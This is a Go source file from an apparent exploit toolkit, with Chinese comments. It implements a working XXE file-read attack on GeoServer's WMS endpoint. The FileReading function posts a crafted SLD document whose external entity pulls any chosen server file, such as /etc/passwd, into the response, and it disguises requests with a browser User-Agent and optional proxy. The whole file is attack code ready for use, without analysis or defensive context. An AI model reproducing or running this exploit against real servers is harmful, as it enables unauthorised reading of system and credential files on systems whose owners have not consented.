package exploits

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// FileReading 通过 XXE 读取目标服务器上的文件
func FileReading(baseURL, filePath string, proxy *url.URL) (string, string, error) {
	// 拼接完整的 WMS 端点
	targetURL := baseURL + "/geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png"

	// 规范化文件路径格式：file:///path/to/file
	// 如果用户输入 /etc/passwd 或 etc/passwd，都应该变成 file:///etc/passwd
	if !strings.HasPrefix(filePath, "/") {
		filePath = "/" + filePath
	}

	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE StyledLayerDescriptor [
  <!ENTITY xxe SYSTEM "file://%s">
  ]>
<StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld">
  <NamedLayer>
    <Name>&xxe;</Name>
    <UserStyle/>
  </NamedLayer>
</StyledLayerDescriptor>`, filePath)

	client := NewClient(proxy, 10*time.Second)
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Content-Type", "application/vnd.ogc.sld+xml")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}
	return string(body), resp.Status, nil
}
